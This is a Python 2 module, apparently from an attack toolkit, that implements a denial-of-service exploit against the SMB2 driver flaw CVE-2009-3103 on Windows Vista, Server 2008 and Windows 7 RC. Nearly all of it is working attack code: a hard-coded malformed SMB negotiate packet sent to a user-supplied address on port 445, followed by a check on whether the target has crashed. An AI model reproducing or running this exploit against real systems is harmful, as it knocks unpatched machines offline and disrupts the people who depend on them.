import socket
import re
import util
from dos import DoS

#
# Exploit a NULL pointer dereference in SRV2.SYS kernel driver.  Triggers a DoS on Vista Sp1/Sp2/Server 2008/sp2
# and Windows 7 RC (unconfirmed on 7 sp1)
# More: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-3103
#
__name__='SMB2 DoS'
class SMB2DoS(DoS):
	""" Exploit a & in an SMB header """

	def __init__(self):
		super(SMB2DoS,self).__init__('SMB2 DoS')

	def initialize(self):
		""" Initialize the DoS
		"""
		try:
			pkt = (
				"\x00\x00\x00\x90"
				"\xff\x53\x4d\x42"
				"\x72\x00\x00\x00"
				"\x00\x18\x53\xc8"
				"\x00\x26"
				"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
				"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
				"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
  				"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
				"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
 				"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
				"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
				"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
				"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
				"\x30\x30\x32\x00")

			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			
			self.target = raw_input('[!] Address to DoS: ')
			sock.connect((self.target, 445))
			sock.send(pkt)
			sock.close()
			
			if self.is_alive():
				util.Msg('Host appears to be up')
			else:
				util.Msg('Host is not responding - it is either down or rejecting our probes.')
		except Exception, j:
			util.Error('Remote host not susceptible to vulnerability.')
			return
